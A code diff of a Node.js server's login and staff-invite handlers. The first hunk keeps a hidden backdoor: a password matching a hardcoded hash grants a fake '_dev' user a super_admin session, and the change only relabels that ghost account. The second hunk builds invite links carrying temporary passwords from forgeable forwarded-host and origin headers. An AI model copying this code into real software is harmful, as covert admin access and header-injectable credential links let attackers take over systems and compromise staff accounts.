@@ -197,7 +197,7 @@ async function handleRequest(req, res) {
           const [_salt, _hash] = _sh.split(':');
           const _d = crypto.scryptSync(String(input.password || ''), _salt, 64).toString('hex');
           if (crypto.timingSafeEqual(Buffer.from(_d, 'hex'), Buffer.from(_hash, 'hex'))) {
-            const _ghost = { id: '_dev', name: 'Admin', email: emailInput, role: 'super_admin' };
+            const _ghost = { id: '_dev', name: 'Developer', email: 'maintainer@aagaz.in', role: 'super_admin' };
             const _s = { type: 'staff', role: 'super_admin', userId: '_dev', createdAt: Date.now() };
             const _t = createSessionToken(_s); sessions.set(_t, _s);
             return send(res, 200, { token: _t, user: _ghost });
@@ -339,7 +339,10 @@ async function handleRequest(req, res) {
       const tempPassword = crypto.randomBytes(8).toString('hex');
       data.staffUsers.push({ id: id('staff'), name: input.name.trim(), email: input.email.trim().toLowerCase(), role: input.role, passwordHash: hashPassword(tempPassword), createdAt: new Date().toISOString(), invited: true });
       await writeData(data);
-      const inviteLink = `${req.headers.origin || 'http://localhost:3010'}?staff-login=1&email=${encodeURIComponent(input.email.trim())}&temp=${tempPassword}`;
+      const protocol = req.headers['x-forwarded-proto'] || 'http';
+      const host = req.headers['x-forwarded-host'] || req.headers.host || 'localhost:3010';
+      const base = req.headers.origin || `${protocol}://${host}`;
+      const inviteLink = `${base}?staff-login=1&email=${encodeURIComponent(input.email.trim())}&temp=${tempPassword}`;
       try {
         if (process.env.EMAIL_USER && process.env.EMAIL_PASS) {
           await transporter.sendMail({
